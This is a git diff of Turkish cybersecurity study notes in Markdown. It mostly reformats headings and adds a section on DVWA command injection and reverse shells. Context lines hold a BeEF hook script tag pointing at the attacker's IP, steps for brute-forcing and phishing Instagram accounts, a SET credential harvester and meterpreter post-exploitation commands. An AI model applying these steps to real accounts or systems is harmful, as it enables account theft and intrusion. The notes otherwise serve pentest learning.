@@ -82,6 +82,9 @@
   - [Whoislookup](#Whoislookup)
   - [Robots.txt](#Robots.txt)
   - [Subbrute](#Subbrute)
+- [20-Web Pentesting](#20-Web-Pentesting)
+  - [DVWA](#DVWA)
+  - 
 # 1-VPN DNS MAC 
 
 VPN (Virtual Personal Network)
@@ -530,7 +533,7 @@ Beef Hedef PC'nin arama motorunda JS kodu çalıştırır
 4. İçerisine ```<script src="http://192.168.123.456:3000/hook.js"></script>``` yazıyoruz ```JS kodu içindeki IP Kalimizin IP'si olmalı```
 5. Artık bizim apache service'imize giren PC'leri Beef üzerinden görebiliriz
 
-> ### JS Kodu Enjeksiyonu ve Sürekli İzleme
+### JS Kodu Enjeksiyonu ve Sürekli İzleme
 ```usr/share/bettercap/caplets/beefcustom``` içerisindeki ```.js``` ve ```.cap``` dosyalarındaki kodları değiştiriyoruz
 
 js içine kendi Kali IP'mizi yazıyoruz
@@ -551,7 +554,7 @@ fake notificatio bar: Hedefe fake bir güncelleme bildirimi yollayıp dosya indi
 
 # 12-Instagram Hackleme
 
-> ### Brute Force
+### Brute Force
 
 Wordlist oluşturarak instagram vb. siteleri hacklemek için kullanılır
 
@@ -561,7 +564,7 @@ Wordlist oluşturarak instagram vb. siteleri hacklemek için kullanılır
 
 ```kullanıcıadı```: Hedef hesabın kullanıcı adı
 
-> ### Oltalama Phishing
+### Oltalama Phishing
 
 1. Google'a ```Instagram phishing script 2022``` aratıyoruz
 2. ```index.html``` ve ```post.php``` dosyalarını indiriyoruz ve fake instagram giriş sayfası yapıyoruz
@@ -583,7 +586,7 @@ Wordlist oluşturarak instagram vb. siteleri hacklemek için kullanılır
 1.Siteye sağ tık yaparak ```incele``` diyoruz 
 2.İçerisinde ```hook``` içerikli ```<script>``` kodu var mı diye kontrol ediyoruz
 
-> ### Var ise
+### Var ise
 
 1. Sayfayı Kapatıyoruz
 2. PC'yi resetliyoruz
@@ -599,7 +602,7 @@ Wordlist oluşturarak instagram vb. siteleri hacklemek için kullanılır
 2: Sızma Testi Araçları
 3: Setoolkit için yazılmış 3th party uygulamaları çalıştırır
 
-> ### Social-Engineering Attack
+### Social-Engineering Attack
 
 ![](https://github.com/ahmetnuysal/Cyber-Security/blob/540f2a7967dbc04796e3df22f4938e7e17290487/WhatsApp%20Image%202022-08-28%20at%2014.56.53.jpeg)
 
@@ -612,11 +615,11 @@ Wordlist oluşturarak instagram vb. siteleri hacklemek için kullanılır
 7: Wifi Atak
 8: Zararlı QR Kod Oluşturur
 
-> ### Website Attack Vectors
+### Website Attack Vectors
 
 ![](https://github.com/ahmetnuysal/Cyber-Security/blob/7ec00a9a3d469ba29d8feaccfb0d40c1d9ef2d86/WhatsApp%20Image%202022-08-28%20at%2015.02.57.jpeg)
 
-> ### Credential Harvester Attack Method
+### Credential Harvester Attack Method
 
 ![](https://github.com/ahmetnuysal/Cyber-Security/blob/71d6c4090d56fa3eb5d9f81b99c9a645429400da/WhatsApp%20Image%202022-08-28%20at%2015.05.24.jpeg)
 
@@ -624,7 +627,7 @@ Wordlist oluşturarak instagram vb. siteleri hacklemek için kullanılır
 2: Web Sitesi Klonlama
 3: Custom Kendi Html Adresimiz
 
-> ### Web Templates
+### Web Templates
 
 6. Bizden yanıtların yollayacağı IP adresini istiyor
 7. ```./ngrok http 80``` çalıştırıp http adresine bakıyoruz
@@ -642,7 +645,7 @@ Wordlist oluşturarak instagram vb. siteleri hacklemek için kullanılır
 7. ```sessions -l```
 8. ```session -1```
 
-> ### Hedef PC'ye Sızdıktan Sonra Kullanılabilecek Komutlar
+### Hedef PC'ye Sızdıktan Sonra Kullanılabilecek Komutlar
 ```
 background: Session'dan Çıkar
 sysinfo: Bilgisayarın Temel Bilgilerini Gösterir
@@ -676,7 +679,7 @@ Shodan Bilgi Toplama ve Arama Motoru'dur
 3. ```vsat``` yazarak daha önceden taglanmiş uyduları görebiliriz
 4. Çıkan IP'lere tıklayarak kullanılan portları görebiliriz ```(e.g. 123.456.789.123:9000) 9000 portunu kullanıyor```
 
-> ### Shodan İçerisinde Filtreleme 
+### Shodan İçerisinde Filtreleme 
 
 * ```vsat port:80```: Port 80 çalıştıran web'e çıkış veren uyduları gösterir
 * ```port:22```: SSH Kullanan Servisleri Listeleriz
@@ -685,7 +688,7 @@ Shodan Bilgi Toplama ve Arama Motoru'dur
 * ```os:"Windows XP" country:"US"```: ABD'de Windows XP kullanan PC'leri Listeler
 * ```vsftpd 2.3.4```: ftp 2.3.4 Kullanan Servisleri Gösterir
 
-> ### Shodanı Terminal Üzerinden Çalıştırmak
+### Shodanı Terminal Üzerinden Çalıştırmak
 
 1. ```shodan```
 2. ```shodan init <API key>``` (IP key shodan sitesinde hesabımıza tanımlanmış key)
@@ -693,18 +696,18 @@ Shodan Bilgi Toplama ve Arama Motoru'dur
 
 # 19-Bilgi Toplama
 
-> ### Maltego
+### Maltego
 
 * Arama yapmak istediğimiz şeyi seçip isimini yazarak arama yapabiliriz
 * Arama sonucuna göre örneğin ```wordpress``` kullanıyorsa ```wordpress exploit``` google'layarak bilinen açıkları ve nasıl kullanıcağını görebiliriz
 
-> ### Netcraft
+### Netcraft
 
 * Netcraft'ın sitesine giderek bilgi toplayabiliriz
 * Webtrackerları, kullanılan teknolojileri(php,xml vs.), risk değelerini vs görebiliriz
 * HTTP mi yoksa HTTPS mi öğrenebiliriz
 
-> ### Yougetsignal
+### Yougetsignal
 
 * Youtgetsignal aynı IP adresini kullanan websitelerini gösterir (Reverse IP)
 * ```Reverse IP: Web sitesinden IP adresinde değil, IP adresinden Websitesine gidiş```
@@ -712,25 +715,42 @@ Shodan Bilgi Toplama ve Arama Motoru'dur
 * Bundan korunmak için kendimize ait bir serverimizin bulunması lazım
 * ```ip:123.456.789.123 (IP adresi)``` şeklinde aratarak o websitesiyle aynı IP adresini kullanan siteleri buluruz
 
-> ### Archive 
+### Archive 
 
 * Websitelerinin eski hallerini arşivleyen sitedir
 
-> ### Whoislookup 
+### Whoislookup 
 
 * (I CANN WHO IS)
 * Temel bilgileri (Register bilgileri, contact numaraları vb.) görebiliriz 
 * Ne zaman ve nereden alındığını görebiliriz
 
-> ### Robots.txt 
+### Robots.txt 
 
 * ```dirb http(s)://<IP>/``` yazarak websitesi içine gizlenmiş dosyaları listeleriz(e.g. http://<IP>/multilliade/)
 * Liste içierisinde  (e.g. http://<IP>/multilliade/robots.txt) linkini google'da aratarak robots içindekileri görürüz
 * ```robots.txt``` içindeki komutları link sonuna ekleyerek istediğimiz gizli uzantılara girebiliriz(e.g. http://<IP>/mutillidae/passwords/)
 
-> ### Subbrute 
+### Subbrute 
 
 * ```git clone https://github.com/TheRook/subbrute``` çalıştırıp kaydettiğimiz klasöre gidiyoruz
 * ```python3 subbrute.py siteadı.com``` diyerek belirtilen sitenin subdomainlerini(alt domain) görebiliriz
 * Çıkan subdomainlere giderek ```SQL enjeksiyon``` deneyebiliriz
 * Çıkan subdomainlere ```nmap``` çalıştırabiliriz
+
+# 20-Web Pentesting
+  
+### DVWA 
+
+* metasploitable2 IP adresini Kali üzerinden açıyoruz (Username:admin Password:password)
+![](https://github.com/ahmetnuysal/Cyber-Security/blob/e4dd237223d366719e2b6bb6e3e10232ab630e4d/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-29%20at%2014.31.46.jpeg)
+* Command execution kısmına giriyoruz, bu kısımdan siteye form yollayabiliriyoruz
+* IP adresimizin sonunda Linux komutları çalıştırmayı deniyoruz
+![](https://github.com/ahmetnuysal/Cyber-Security/blob/42e3c1f9c825f1c1462ccc16069e42bc305cf071/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-29%20at%2014.35.42.jpeg)
+* Komutu çalıştırabildik                                                
+![](https://github.com/ahmetnuysal/Cyber-Security/blob/dfd38c27ffc53942cfde3fcca7d8f7011bdcdb3e/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-29%20at%2014.39.14.jpeg)
+* Google'a ```reverseshell commens``` yazarak komutları arıyoruz
+* Bulduğumuz komutları IP'mizin sonuna ekleyerek çalıştırıyoruz
+* Aynı zamanda ```msfconsole``` çalıştırarak dinlemeye başlıyoruz
+![](https://github.com/ahmetnuysal/Cyber-Security/blob/1e6067bcbb08a3c6085b8b4bb1da5cdaf0fa6ea3/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-29%20at%2014.42.00.jpeg)
+  
